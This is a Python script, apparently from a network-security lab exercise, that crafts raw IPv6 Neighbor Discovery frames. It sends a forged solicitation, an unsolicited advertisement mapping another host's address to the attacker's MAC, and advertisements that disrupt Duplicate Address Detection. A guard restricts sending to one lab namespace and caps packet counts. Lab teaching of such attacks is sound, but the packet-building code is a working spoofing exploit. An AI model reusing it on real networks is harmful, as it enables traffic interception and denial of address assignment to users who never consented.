#!/usr/bin/env python3
"""Bounded IPv6 ND tests in the Lab05 attacker namespace; stdlib only."""
import argparse
import ipaddress
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path

ATK_MAC = '02:05:05:00:01:aa'
ATK_ADDR = '2000::a/64'
PC1_MAC = '02:05:05:00:01:01'

def mb(value):
    return bytes.fromhex(value.replace(':', ''))

def guard():
    mac = Path('/sys/class/net/eth0/address').read_text().strip().lower()
    ips = subprocess.check_output(['ip', '-6', '-o', 'addr', 'show', 'dev', 'eth0'], text=True)
    if mac != ATK_MAC or ATK_ADDR not in ips:
        sys.exit('STOP: only l05atk with expected MAC/IPv6 may send frames')

def checksum(message):
    if len(message) & 1:
        message += b'\x00'
    words = struct.unpack('!' + 'H' * (len(message)//2), message)
    total = sum(words)
    while total >> 16:
        total = (total & 0xffff) + (total >> 16)
    return (~total) & 0xffff

def frame(dst_mac, src_ipv6, dst_ipv6, icmp):
    src, dst = (ipaddress.IPv6Address(s).packed for s in (src_ipv6, dst_ipv6))
    pseudo = src + dst + struct.pack('!I3xB', len(icmp), 58)
    icmp = icmp[:2] + struct.pack('!H', checksum(pseudo+icmp)) + icmp[4:]
    hdr = struct.pack('!IHBB16s16s', 6 << 28, len(icmp), 58, 255, src, dst)
    return mb(dst_mac) + mb(ATK_MAC) + b'\x86\xdd' + hdr + icmp

def ns():
    # Forged NS: PC2 IPv6 with the attacker's source-link-layer option.
    payload = struct.pack('!BBHI', 135,0,0,0) + ipaddress.IPv6Address('2000::1').packed
    payload += b'\x01\x01' + mb(ATK_MAC)
    return frame('33:33:ff:00:00:01', '2000::2', 'ff02::1:ff00:1', payload)

def na():
    # Unsolicited NA, S=0 O=1: claim PC2's IPv6 maps to attacker MAC.
    payload = struct.pack('!BBHI',136,0,0,0x20000000) + ipaddress.IPv6Address('2000::2').packed
    payload += b'\x02\x01' + mb(ATK_MAC)
    return frame(PC1_MAC, '2000::2', '2000::1', payload)

def dad():
    # Claim unused candidate 2000::55aa while SWA performs IPv6 DAD.
    payload = struct.pack('!BBHI',136,0,0,0x20000000) + ipaddress.IPv6Address('2000::55aa').packed
    payload += b'\x02\x01' + mb(ATK_MAC)
    return frame('33:33:00:00:00:01','2000::a','ff02::1',payload)

def main():
    p=argparse.ArgumentParser()
    p.add_argument('mode',choices=['ns','na','dad'])
    a=p.parse_args()
    guard()
    total={'ns':3,'na':3,'dad':20}[a.mode]
    delay={'ns':0.2,'na':0.2,'dad':0.12}[a.mode]
    packet={'ns':ns,'na':na,'dad':dad}[a.mode]()
    s=socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(0x0003))
    try:
        s.bind(('eth0',0))
        for _ in range(total):
            s.send(packet)
            time.sleep(delay)
    finally:
        s.close()
    print(f'MODE={a.mode} SENT={total} FRAME_BYTES={len(packet)} LAB05_ONLY')

if __name__=='__main__':
    main()
